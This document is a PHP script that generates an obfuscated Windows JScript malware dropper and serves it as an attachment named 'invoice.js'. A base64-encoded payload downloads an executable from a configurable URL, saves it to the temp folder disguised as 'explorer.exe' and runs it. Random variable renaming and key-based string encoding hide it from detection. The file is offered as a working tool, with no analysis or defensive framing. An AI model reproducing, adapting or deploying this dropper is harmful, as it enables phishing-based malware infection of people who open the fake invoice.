<?php
$url = "DOWNLOAD LINK HERE";
$processName = "explorer";
function randomString($length = 8)
{
	$characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    $result = "";
    for ($i = 0; $i < $length; $i++)
        $result .= $characters[mt_rand(0, 51)];
	return $result;
}
function obfuscateVariables($str)
{
	$varNumber = 0; // 0 is used for the string obfuscator function in $exploit
	while(true)
	{
		$varName = "~var".((string)$varNumber)."~"; // variable name referenced in $exploit
		$str = str_replace($varName,randomString(mt_rand(3,8)),$str,$count); // replace all with a random string (length between 3-8)
		if($count == 0) // if none found stop
			break;
		$varNumber++;
	}
	return $str;
}

function obfuscateStrings($str,$key)
{
	$str = str_replace("[KEY]",$key,$str); // put the decryption key in
	$length = strlen($str);
	$startPos = 0;
	while($startPos !== FALSE)
	{
		$startPos = strpos($str,"`str:");
		if($startPos === FALSE) // break if none found
			break;
		$endPos = strpos($str,"~",$startPos);
		$text = substr($str,$startPos+5,$endPos - $startPos - 5); // text to be obfuscated
		$textLen = strlen($text);
		$res = "";
		for($x = 0;$x < $textLen;$x++) // obfuscate string
		{
			$charCode = ord(substr($text,$x,1)) + $key; // add key to charcode
			$randInt = mt_rand(0,$charCode); // pick a random number
			$res .= "~var0~(".((string)($charCode - $randInt))."+".((string)$randInt).")"; // subtract that number from charcode and add code to addition them runtime
			if($x != $textLen - 1)
				$res .= "+"; // concat operator in js
		}
		$str = substr($str,0,$startPos).$res.substr($str,$endPos+1); // re-assemble the string
		
	}
	return $str;
	
}
function setConfig($str,$url,$key,$proc = "explorer")
{
	// [URL] for download url (direct)
	// [KEY] for decryption key
	// [PROC] for process name
	$str = str_replace("[URL]",$url,$str);
	$str = str_replace("[KEY]",$key,$str);
	$str = str_replace("[PROC]",$proc,$str);
	return $str;
}
$key = mt_rand(52,6931);
$exploit = base64_decode("ZnVuY3Rpb24gfnZhcjB+KH52YXIxMH4pe3JldHVybiBTdHJpbmcuZnJvbUNoYXJDb2RlKH52YXIxMH4tW0tFWV0pO30gdmFyIH52YXIxfj10aGlzW2BzdHI6QWN0aXZlWE9iamVjdH5dO3ZhciB+dmFyMn49bmV3IH52YXIxfihgc3RyOldTY3JpcHQuU2hlbGx+KTt2YXIgfnZhcjN+PW5ldyB+dmFyMX4oYHN0cjpNU1hNTDIuWE1MSFRUUH4pO3ZhciB+dmFyNH49fnZhcjJ+W2BzdHI6RXhwYW5kRW52aXJvbm1lbnRTdHJpbmdzfl0oYHN0cjolVEVNUCV+KTtmdW5jdGlvbiB+dmFyNX4ofnZhcjZ+LH52YXI3fil7dmFyIH52YXI4fj1+dmFyNH4rJy8nK352YXI3fitgc3RyOi5leGV+O352YXIzfltgc3RyOm9wZW5+XShgc3RyOkdFVH4sfnZhcjZ+LGZhbHNlKTt+dmFyM35bYHN0cjpzZW5kfl0oKTtpZih+dmFyM34uc3RhdHVzPT0yMDApe3ZhciB+dmFyOX49bmV3IH52YXIxfihgc3RyOkFET0RCLlN0cmVhbX4pO352YXI5fltgc3RyOm9wZW5+XSgpO352YXI5fi50eXBlPTE7fnZhcjl+W2BzdHI6d3JpdGV+XSh+dmFyM35bYHN0cjpSZXNwb25zZUJvZHl+XSk7fnZhcjl+W2BzdHI6cG9zaXRpb25+XT0wO352YXI5fltgc3RyOnNhdmVUb0ZpbGV+XSh+dmFyOH4sMik7fnZhcjl+LmNsb3NlKCk7fnZhcjJ+W2BzdHI6UnVufl0ofnZhcjh+LDEsMCl9fX52YXI1fihgc3RyOltVUkxdfixgc3RyOltQUk9DXX4pOw==");
$exploit = setConfig($exploit,$url,$key,$processName);
$exploit = obfuscateVariables(obfuscateStrings($exploit,$key));
header("Content-disposition: attachment;filename=invoice.js");
echo($exploit);
?>